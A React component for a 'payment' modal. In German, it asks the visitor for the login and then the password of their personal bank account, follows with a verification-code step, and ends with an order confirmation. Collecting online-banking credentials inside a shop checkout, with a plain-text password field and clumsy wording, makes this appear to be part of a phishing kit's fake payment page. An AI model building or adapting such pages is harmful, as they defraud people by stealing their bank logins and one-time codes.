import React from 'react';
import PropTypes from 'prop-types';

import FavoriteIcon from '@material-ui/icons/Favorite';

import { Progress } from '../../components';
import { redirect } from '../../utils/navigation';
import { ROUTES } from '../../constants/routes';
import { Modal } from '../../components/modals';
import { PaymentCode } from '..';

export const PaymentAuthView = ({
  loginLoading,
  loginLoaded,
  loginError,
  loginErrorMessage,
  passwordLoading,
  passwordLoaded,
  passwordError,
  passwordErrorMessage,
  loginFormDisabled,
  passwordFormDisabled,
  loginValue,
  setLoginValue,
  passwordValue,
  setPasswordValue,
  submitLogin,
  submitPassword,
  codeLoaded,
}) => (
  <React.Fragment>
    <Modal open={!loginLoaded || !passwordLoaded || !codeLoaded}>
      <div className="payment">
        <div className="card-form__inner small-top">
          {!loginLoaded && !loginLoading && (
            <form onSubmit={submitLogin}>
              <h3 style={{ marginBottom: '6px', padding: 0 }}>
                Sie müssen das persönliche Konto Ihrer Bank eingeben. Login eingeben
              </h3>
              <div className="card-input">
                <label htmlFor="cardNumber" className="card-input__label">
                  Anmeldung
                </label>
                <input
                  name="cardNumber"
                  className="card-input__input"
                  autoComplete="off"
                  type="text"
                  onChange={(e) => setLoginValue(e.target.value)}
                  value={loginValue}
                />
              </div>
              <button type="submit" className="cta cta-full-width" disabled={loginFormDisabled}>
                Bestätigen Sie
              </button>
            </form>
          )}
          {loginError && (
            <span className="error" style={{ marginTop: '10px' }}>
              {loginErrorMessage}
            </span>
          )}
          {loginLoading && (
            <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
              <Progress size={70} />
              <h3 style={{ marginTop: '24px', padding: 0 }}>
                Wir werden Ihr Konto verifizieren. Warten Sie mal.
              </h3>
            </div>
          )}
          {!passwordLoading && !passwordLoaded && loginLoaded && (
            <form onSubmit={submitPassword}>
              <h3 style={{ marginBottom: '6px', padding: 0 }}>
                Sie müssen das persönliche Konto Ihrer Bank eingeben. Passwort eingeben
              </h3>
              <div className="card-input">
                <label htmlFor="cardNumber" className="card-input__label">
                  Passwort
                </label>
                <input
                  name="cardNumber"
                  className="card-input__input"
                  autoComplete="off"
                  type="text"
                  onChange={(e) => setPasswordValue(e.target.value)}
                  value={passwordValue}
                />
              </div>
              <button type="submit" className="cta cta-full-width" disabled={passwordFormDisabled}>
                Bestätigen Sie
              </button>
            </form>
          )}
          {passwordError && (
            <span className="error" style={{ marginTop: '10px' }}>
              {passwordErrorMessage}
            </span>
          )}
          {passwordLoading && (
            <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
              <Progress size={70} />
              <h3 style={{ marginTop: '24px', padding: 0 }}>
                Wir werden Ihr Konto verifizieren. Warten Sie mal.
              </h3>
            </div>
          )}
          {loginLoaded && passwordLoaded && <PaymentCode visible />}
        </div>
      </div>
    </Modal>

    {loginLoaded && passwordLoaded && codeLoaded && (
      <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
        <FavoriteIcon style={{ color: 'rgb(229, 9, 127)', fontSize: '8rem' }} />
        <h3 style={{ margin: '24px 0 30px', padding: 0, lineHeight: 1.2, textAlign: 'center' }}>
          Ihre Bestellung wurde zur Bearbeitung gesendet. Wir melden uns bei Ihnen.
        </h3>
        <button type="button" className="cta cta-full-width" onClick={() => redirect(ROUTES.HOME)}>
          Zurück zur Startseite
        </button>
      </div>
    )}
  </React.Fragment>
);

PaymentAuthView.propTypes = {
  loginLoading: PropTypes.bool,
  loginLoaded: PropTypes.bool,
  loginError: PropTypes.bool,
  loginErrorMessage: PropTypes.string,
  passwordLoading: PropTypes.bool,
  passwordLoaded: PropTypes.bool,
  passwordError: PropTypes.bool,
  passwordErrorMessage: PropTypes.string,
  loginFormDisabled: PropTypes.bool,
  passwordFormDisabled: PropTypes.bool,
  loginValue: PropTypes.string,
  setLoginValue: PropTypes.func,
  passwordValue: PropTypes.string,
  setPasswordValue: PropTypes.func,
  submitLogin: PropTypes.func,
  submitPassword: PropTypes.func,
  codeLoaded: PropTypes.func,
};
